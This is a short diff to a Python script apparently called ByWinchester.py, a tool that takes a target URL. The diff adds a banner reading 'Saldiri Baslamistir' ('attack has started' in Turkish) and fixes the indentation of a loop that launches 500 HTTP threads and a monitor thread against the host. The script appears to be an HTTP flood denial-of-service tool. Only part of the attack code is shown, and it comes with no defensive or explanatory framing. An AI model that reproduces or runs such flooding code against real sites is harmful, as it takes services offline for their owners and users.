@@ -64,7 +64,11 @@ def usage():
     print('USAGE: python ByWinchester.py <url>')
     print('ByWinchester website : ByWinchester')
     print("\a")
-print('---------------------------------------------------')
+    print("""
+                   ...
+                 ;::::;   Saldiri Baslamistir...                             
+    """)
+    print('---------------------------------------------------')
 
 # http request
 def httpcall(url):
@@ -138,8 +142,8 @@ else:
             url = url + "/"
         m = re.search('http\://([^/]*)/?.*', url)
         host = m.group(1)
-        for i in range(500):
-  	t = HTTPThread()
-	t.start()
-	t = MonitorThread()
-	t.start()
+		for i in range(500):
+			t = HTTPThread()
+			t.start()
+		t = MonitorThread()
+		t.start()
